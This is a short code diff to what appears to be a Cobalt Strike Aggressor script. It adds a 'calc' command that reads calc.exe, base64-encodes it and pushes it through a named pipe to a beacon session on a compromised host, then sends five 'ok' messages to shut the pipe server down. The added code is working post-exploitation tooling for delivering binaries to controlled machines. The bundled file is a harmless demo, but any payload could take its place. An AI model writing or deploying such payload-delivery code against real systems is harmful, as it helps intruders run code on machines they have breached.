@@ -12,3 +12,21 @@ sub _upload_file{
 alias upload_file {
 	_upload_file($1, $2, $3);
 }
+
+alias calc {
+    local('$bid');
+    $bid = $1;
+    $handle = openf(script_resource("calc.exe"));
+    $data = readb($handle,-1);
+    closef($handle);
+
+    bupload_raw($bid,"\\\\.\\pipe\\pipename",base64_encode($data));
+
+    # This code turn off Pipeserver
+    for ($total = 0; $total < 5; $total++)
+    {
+        bpause($bid,100);
+        bupload_raw($bid,"\\\\.\\pipe\\pipename","ok");
+    }
+
+}
